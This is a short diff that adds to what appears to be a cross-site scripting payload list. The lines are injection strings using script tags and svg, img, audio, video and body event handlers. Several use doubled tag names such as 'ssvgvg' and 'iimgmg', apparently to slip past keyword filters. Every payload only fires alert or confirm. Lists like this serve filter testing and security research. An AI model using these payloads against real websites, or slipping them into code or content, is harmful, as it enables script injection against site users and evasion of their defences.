@@ -1,1 +1,8 @@
 "><svg onload=alert(1)>
+rhaul"><scRipt>alert(1)</scriPt>
+<ssvgvg xmlns="http://www.w3.org/2000/ssvgvg" width="400" height="400">   <sscriptcript type="text/javasscriptcript">     alert('XSS attack!');   </script> <script/ssvgvg>
+<iimgmg src=x onerror=confirm(1)>
+<aaudioudio src/onerror=alert(1)>	
+<vivideodeo onfocus=alert(1) autofocus tabindex=1>
+<bbodyody oninput=javascript:alert(/AmoloHT/)><input autofocus>
+
